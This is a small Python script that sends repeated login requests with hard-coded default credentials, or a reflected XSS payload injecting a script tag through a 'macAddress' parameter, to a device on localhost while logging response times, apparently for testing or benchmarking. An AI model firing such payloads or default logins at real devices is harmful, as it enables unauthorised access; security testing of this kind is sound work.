# Sends a predefined XSS/login HTTP-request to localhost.

import argparse
import ssl
import requests
import warnings
import datetime

# Login to the device
def login(url):
  url = url + '/login.php'
  headers = {'username' : 'admin',
    'password' : 'password',
    'id' : '123456'}

  timestamp = str(datetime.datetime.now().strftime("%H:%M:%S"))
  r = requests.post(url, headers=headers, verify=False)
  print(timestamp + "," + str(r.elapsed) + "," + str(r.status_code))

# Send the attack
def attack(url):
  payload = '?/boardData103?macAddress="><script>alert(1)</script>'

  timestamp = str(datetime.datetime.now().strftime("%H:%M:%S"))
  r = requests.get(url + payload, verify=False)
  print(timestamp + "," + str(r.elapsed) + "," + str(r.status_code))

# Settings, parrse url, read args, log and send the packets
def main():
  warnings.filterwarnings("ignore", message="Unverified HTTPS request is being made to host 'localhost'")

  if args.port == 20443:
    url = 'https://localhost:' + str(args.port)
  else:
    url = 'http://localhost:' + str(args.port)

  for x in range(args.repeats):
    if args.mode == 'xss':
      attack(url)
    else:
      login(url)

# Define the command line parser     
if __name__ == "__main__":
  parser = argparse.ArgumentParser(
    description='Sends a predefined XSS/login -script to localhost and records response times.')
  parser.add_argument('mode',
    type=str,
    choices=['xss', 'login'],
    help='Choses the script mode.')
  parser.add_argument('port',
    type=int, 
    help='Chooses the port.')
  parser.add_argument('-r',
    type=int,
    default=1,
    action='store',
    dest='repeats',
    help='Repeats the request a specified number of time')

  args = parser.parse_args()

  main()
